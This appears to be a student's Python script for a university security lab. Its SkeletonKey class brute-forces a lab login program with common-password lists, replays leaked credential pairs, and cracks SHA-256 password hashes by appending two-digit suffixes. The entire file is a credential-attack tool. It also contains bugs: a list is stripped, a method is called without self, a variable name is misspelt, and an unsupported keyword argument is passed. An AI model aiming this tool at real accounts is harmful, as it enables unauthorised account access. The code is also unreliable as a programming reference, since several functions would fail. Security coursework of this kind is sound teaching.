import subprocess
import hashlib
from datetime import datetime

class SkeletonKey:
    ''' 
    Skeleton Key is an object designed to adapt to each questions' parameters and search for users' password(s).
    
    params:
        user_file_path
            - Input the path to the file that contains usernames if applicable
        
        passwd_file_path 
            - Input the path to the file than contains passwords
        
        users 
            - Input the usernames of users if there is no file as a list
        
        exe_path
            - Input the path of the python file to execute the command 'python3 [path] [username] [password]'

        cracked_users
            - Sets a maxmimum amount of users to crack for execessively long bruteforces
    
    '''
    def __init__(self, user_file_path=None, passwd_file_path=None, users=None, exe_path=None, cracked_users=None, print_interval=None):
        self.user_file_path = user_file_path
        self.passwd_file_path = passwd_file_path
        self.exe_path = exe_path
        self.cracked_users = cracked_users if cracked_users else set()
        self.users = self.compile_file_to_list() if user_file_path else list([users])
        self.print_interval = print_interval
        self.number_runs = 0
    
    def compile_file_to_list(self):
        ''' 
        Compiles the file of usernames to a list to iterate over in the bruteforce function
            - This method assumes the length of an arbitrary list of usernames << the length of an arbitrary list of common passwords
        
        '''
        compiled_list = []
        with open(self.user_file_path, "r") as file:
            for row in file:
                item = row.strip()
                if item not in self.cracked_users:
                    compiled_list.append(item)
        
        return compiled_list

    def attempt_crack(self, user, passwd):
        '''
        Attempts to crack user `user` with passwd `passwd`.
        Returns True and prints to terminal if crack attempt was successful.
        Returns False otherwise.

        '''
        run = subprocess.run(["python3", self.exe_path, user, passwd], capture_output=True, text=True)

        if run.stdout == "Login successful.\n":
            curr_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{curr_time}] Attempt {self.number_runs} \n==!!!== Successful crack attempt ==!!!== \nUser: {user} \nPassword: {passwd}\n")
            
            return True
        
        return False
    
    def log_crack_attempts(self, user, passwd):
        '''
        Logs an attempt every `self.print_interval` runs to the terminal, 
        showing the attempt number, timestamp, and tested credentials.
        Returns void.
        '''
        if self.print_interval:
            if self.number_runs % self.print_interval == 0: 
                curr_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print(f"[{curr_time}] Attempt {self.number_runs} \nCurrent test: {user} --> {passwd}\n")

    def crack_pass_bruteforce(self, max_cracked=float('inf')): # Used for Q1, Q2, Q3
        number_cracked = 0
        self.number_runs = 0
        cracked_map = dict()

        try:
            for user in self.users:
                with open(self.passwd_file_path, "r") as file:
                    for row in file:
                        self.number_runs += 1
                            
                        passwd = row.strip()
                        
                        if self.attempt_crack(user, passwd):    
                            number_cracked += 1
                            cracked_map[user] = passwd
                            if number_cracked >= max_cracked: return cracked_map

                        self.log_crack_attempts(user, passwd)  
            
            return cracked_map
        
        except KeyboardInterrupt:
            print("Quit successfully\n")

    def parse_row(self, row):
        split_string = row.split(",").strip()
        return split_string[0], split_string[1]
        
    def crack_pass_leaked_database(self): # Used for Q4
        ''''''
        self.number_runs = 0
        cracked_map = {}
        user_set = set(self.users)

        with open(self.passwd_file_path, "r") as file:
            for row in file:
                self.number_runs += 1
                user, passwd = parse_row(row)

                if user in user_set:
                    if self.attempt_crack(user, passwd):
                        cracked_map[user] = passwd
                        return cracked_map
                
                self.log_crack_attempts(user, passwd)  

    def crack_pass_hash_brute_force(self): # Used for Q5
        self.number_runs = 0
        user_set = set(self.users)
        hash_dict = {}

        with open(self.passwd_file_path, "r") as file:
            for row in file:
                user, hashkey = parse_row(row)

                if user in user_set:
                    hash_dict[hash_key] = user
        
        with open("/home/cse/Lab1/Q5/PwnedPWs100k") as file:
            for row in file:
                # Concatenate 00-99
                passwd = row.strip()
                for i in range(100): 
                    self.number_runs += 1

                    if i < 10: concat_number = f"0{i}"
                    else: concat_number = str(i)

                    concat_passwd = passwd + concat_number

                    # Hash current password
                    h = hashlib.sha256()
                    h.update(bytes(concat_passwd, "utf-8"))
                    hash_candidate = h.hexdigest()

                    if hash_candidate in hash_dict:
                        user = hash_dict[hash_candidate]

                        if self.attempt_crack(user, concat_passwd):
                            return
                        
                    self.log_crack_attempts(user, concat_passwd)

                        

                    
                    





        
if __name__ == '__main__':
    ###########################################
    ##########          Q1          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q1/MostCommonPWs",   # passwd path
        "SkyRedFalcon914",                   # users
        "/home/cse/Lab1/Q1/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      users = test_param[1],
                      exe_path = test_param[2])
    
    key.crack_pass_bruteforce()



    ###########################################
    ##########          Q2          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q2/MostCommonPWs",   # passwd path
        "/home/cse/Lab1/Q2/gang",            # user path
        "/home/cse/Lab1/Q2/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2],
                      cracked_users=['SkyRedFalcon914'])

    key.crack_pass_bruteforce()

    ###########################################
    ##########          Q3          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q3/PwnedPWs100k",   # passwd path
        "/home/cse/Lab1/Q3/gang",            # user path
        "/home/cse/Lab1/Q3/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2],
                      cracked_users=set(["SkyRedFalcon914", "MountainPurpleShark585"]))
    
    key.crack_pass_bruteforce(max_cracked=1, print_interval=100)



    ###########################################
    ##########          Q4          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q4/PwnedPWfile", # passwd path
        "/home/cse/Lab1/Q4/gang", # user path
        "/home/cse/Lab1/Q4/Login.pyc" # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2],
                      cracked_users=set(["SkyRedFalcon914", "MountainPurpleShark585"]),
                      print_interval=100
    )
    key.crack_pass_leaked_database()



    ###########################################
    ##########          Q5          ###########
    ###########################################         
    test_param = [
        "/home/cse/Lab1/Q5/HashedPWs",   # passwd path
        "/home/cse/Lab1/Q5/gang",            # user path
        "/home/cse/Lab1/Q5/Login.pyc"        # exe path
    ]
    
    key = SkeletonKey(passwd_file_path = test_param[0],
                        user_file_path = test_param[1],
                        exe_path = test_param[2],
                        cracked_users=set(["SkyRedFalcon914", "MountainPurpleShark585"]),
                        print_interval=1000000
        )

    key.crack_pass_hash_brute_force()
